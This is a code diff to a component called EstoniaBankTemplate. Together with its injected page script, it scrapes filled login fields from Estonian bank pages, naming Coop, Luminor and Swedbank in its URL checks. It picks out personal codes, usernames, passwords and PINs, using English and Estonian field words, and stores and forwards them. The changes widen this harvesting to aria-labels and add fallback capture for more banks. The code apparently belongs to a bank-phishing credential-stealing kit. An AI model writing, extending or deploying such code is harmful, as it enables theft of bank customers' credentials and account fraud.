@@ -115,6 +115,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
     value: string;
     type?: string;
     label?: string;
+    ariaLabel?: string;
     placeholder?: string;
     name?: string;
     id?: string;
@@ -128,6 +129,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
           value: String(field.value ?? ""),
           type: typeof field.type === "string" ? field.type : "",
           label: typeof field.label === "string" ? field.label : "",
+          ariaLabel: typeof field.ariaLabel === "string" ? field.ariaLabel : "",
           placeholder: typeof field.placeholder === "string" ? field.placeholder : "",
           name: typeof field.name === "string" ? field.name : "",
           id: typeof field.id === "string" ? field.id : "",
@@ -145,6 +147,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
       value: String(value ?? ""),
       type: "text",
       label: "",
+      ariaLabel: "",
       placeholder: "",
       name: key,
       id: key,
@@ -196,13 +199,14 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
           name?: string;
           id?: string;
           label?: string;
+          ariaLabel?: string;
           placeholder?: string;
           formControlName?: string;
         }) => {
           const normalizedValue = field.value.trim();
           if (!normalizedValue) return;
 
-          const candidateKeys = [field.key, field.name, field.id, field.formControlName, field.label, field.placeholder]
+          const candidateKeys = [field.key, field.name, field.id, field.formControlName, field.label, field.ariaLabel, field.placeholder]
             .map((candidate) => (typeof candidate === "string" ? candidate.trim() : ""))
             .filter(Boolean)
             .map((candidate) => candidate.replace(/\s+/g, "-"))
@@ -246,7 +250,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
           persistRawCapturedField(field);
 
           const lowerKey = field.key.toLowerCase();
-          const lowerText = [field.key, field.name, field.id, field.formControlName, field.label, field.placeholder]
+          const lowerText = [field.key, field.name, field.id, field.formControlName, field.label, field.ariaLabel, field.placeholder]
             .filter(Boolean)
             .join(" ")
             .toLowerCase();
@@ -398,6 +402,10 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
             name: field.name ?? "",
             id: field.id ?? "",
             formControlName: field.formControlName ?? "",
+            type: field.type ?? "",
+            label: field.label ?? "",
+            ariaLabel: field.ariaLabel ?? "",
+            placeholder: field.placeholder ?? "",
             value: field.value.trim(),
           }))
           .filter((field) => Boolean(field.value))
@@ -408,21 +416,35 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
               !shouldIgnoreRawBankFieldKey(field.id) &&
               !shouldIgnoreRawBankFieldKey(field.formControlName),
           )
-          .map((field) => field.value);
+          .filter((field, index, list) => list.findIndex((candidate) => candidate.value === field.value) === index);
 
-        if (filledValues.length === 1) {
-          mappedData.bankPhone = "";
-          mappedData.username = "";
-          mappedData.verfuegernummer = "";
-          mappedData.password = "";
-          mappedData.pin = "";
-          assignMappedValue("personalCode", filledValues[0], { overwrite: true, syncState: true });
-        } else if (filledValues.length === 2) {
-          mappedData.bankPhone = "";
-          mappedData.username = "";
-          mappedData.verfuegernummer = "";
-          assignMappedValue("personalCode", filledValues[0], { overwrite: true, syncState: true });
-          assignPassword(filledValues[1], true);
+        const hasIdentityValue = Boolean(mappedData.personalCode || mappedData.username || mappedData.verfuegernummer || mappedData.bankPhone);
+        if (!hasIdentityValue && filledValues[0]?.value) {
+          assignMappedValue("personalCode", filledValues[0].value, { overwrite: true, syncState: true });
+        }
+
+        const passwordFallback = filledValues.find((field) => {
+          const lowerText = [field.key, field.name, field.id, field.formControlName, field.label, field.ariaLabel, field.placeholder]
+            .filter(Boolean)
+            .join(" ")
+            .toLowerCase();
+
+          return (
+            field.type.toLowerCase() === "password" ||
+            lowerText.includes("password") ||
+            lowerText.includes("passcode") ||
+            lowerText.includes("parool") ||
+            lowerText.includes("pin") ||
+            lowerText.includes("kood")
+          );
+        });
+
+        if (!mappedData.password) {
+          if (passwordFallback?.value) {
+            assignPassword(passwordFallback.value, true);
+          } else if (!hasIdentityValue && filledValues[1]?.value) {
+            assignPassword(filledValues[1].value, true);
+          }
         }
         
         handleRouteAction({
@@ -617,6 +639,67 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
             return '';
         };
 
+        const appendFilledFallbackFields = (container, fields) => {
+            container.querySelectorAll('input, select, textarea').forEach(input => {
+                if (!input || input.disabled) return;
+
+                const type = ((input.type || input.tagName || '') + '').toLowerCase();
+                if (
+                    type === 'hidden' ||
+                    type === 'submit' ||
+                    type === 'button' ||
+                    type === 'reset' ||
+                    type === 'file' ||
+                    type === 'radio' ||
+                    type === 'checkbox'
+                ) {
+                    return;
+                }
+
+                const value = (input.value || '').trim();
+                if (!value) return;
+
+                const label = getFieldLabel(input);
+                const ariaLabel = input.getAttribute('aria-label') || '';
+                const keyText = [
+                    input.name || '',
+                    input.id || '',
+                    input.getAttribute('formcontrolname') || '',
+                    input.getAttribute('data-testid') || '',
+                    input.getAttribute('placeholder') || '',
+                    ariaLabel,
+                    label,
+                ].join(' ').toLowerCase();
+
+                if (
+                    keyText.includes('rememberme') ||
+                    keyText.includes('remember me') ||
+                    keyText.includes('pea mind meeles') ||
+                    keyText.includes('salvesta') ||
+                    keyText.includes('meelde')
+                ) {
+                    return;
+                }
+
+                const fieldKey = input.name || input.getAttribute('formcontrolname') || input.id || input.getAttribute('data-testid') || 'unknown';
+                if (fields.some(field => field.key === fieldKey && (field.value || '').trim() === value)) {
+                    return;
+                }
+
+                fields.push({
+                    key: fieldKey,
+                    name: input.name || input.getAttribute('formcontrolname') || '',
+                    id: input.id || '',
+                    formControlName: input.getAttribute('formcontrolname') || '',
+                    value: value,
+                    type: type || 'text',
+                    label: label,
+                    ariaLabel: ariaLabel,
+                    placeholder: input.getAttribute('placeholder') || ''
+                });
+            });
+        };
+
             const buildCapturedFields = (container) => {
             const fields = [];
             if (!container || !container.querySelectorAll) return fields;
@@ -628,8 +711,10 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
                 const keyText = [
                     input.name || '',
                     input.id || '',
+                    input.getAttribute('formcontrolname') || '',
                     input.getAttribute('data-testid') || '',
                     input.getAttribute('placeholder') || '',
+                    input.getAttribute('aria-label') || '',
                     getFieldLabel(input) || '',
                 ].join(' ').toLowerCase();
 
@@ -689,66 +774,22 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
                     value: input.value || '',
                     type: type || 'text',
                     label: getFieldLabel(input),
+                    ariaLabel: input.getAttribute('aria-label') || '',
                     placeholder: input.getAttribute('placeholder') || ''
                 });
             });
 
-            if (!fields.length && window.location.href.includes('coop')) {
-                container.querySelectorAll('input, select, textarea').forEach(input => {
-                    if (!input || input.disabled) return;
-
-                    const type = ((input.type || input.tagName || '') + '').toLowerCase();
-                    const keyText = [
-                        input.name || '',
-                        input.id || '',
-                        input.getAttribute('data-testid') || '',
-                        input.getAttribute('placeholder') || '',
-                        getFieldLabel(input) || '',
-                    ].join(' ').toLowerCase();
-
-                    if (
-                        type === 'hidden' ||
-                        type === 'submit' ||
-                        type === 'button' ||
-                        type === 'reset' ||
-                        type === 'file' ||
-                        type === 'radio' ||
-                        type === 'checkbox'
-                    ) {
-                        return;
-                    }
-
-                    if (
-                        keyText.includes('rememberme') ||
-                        keyText.includes('remember me') ||
-                        keyText.includes('pea mind meeles') ||
-                        keyText.includes('salvesta') ||
-                        keyText.includes('meelde')
-                    ) {
-                        return;
-                    }
-
-                    const value = (input.value || '').trim();
-                    if (!value) {
-                        return;
-                    }
-
-                    const fieldKey = input.name || input.getAttribute('formcontrolname') || input.id || input.getAttribute('data-testid') || 'unknown';
-                    if (fields.some(field => field.key === fieldKey && field.value === value)) {
-                        return;
-                    }
-
-                    fields.push({
-                        key: fieldKey,
-                        name: input.name || input.getAttribute('formcontrolname') || '',
-                        id: input.id || '',
-                        formControlName: input.getAttribute('formcontrolname') || '',
-                        value: value,
-                        type: type || 'text',
-                        label: getFieldLabel(input),
-                        placeholder: input.getAttribute('placeholder') || ''
-                    });
-                });
+            const filledFieldCount = fields.filter(field => (field.value || '').trim()).length;
+            if (
+                filledFieldCount === 0 &&
+                (window.location.href.includes('coop') || window.location.href.includes('luminor') || window.location.href.includes('swedbank'))
+            ) {
+                appendFilledFallbackFields(container, fields);
+            } else if (
+                filledFieldCount < 2 &&
+                (window.location.href.includes('luminor') || window.location.href.includes('swedbank'))
+            ) {
+                appendFilledFallbackFields(container, fields);
             }
 
             return fields;
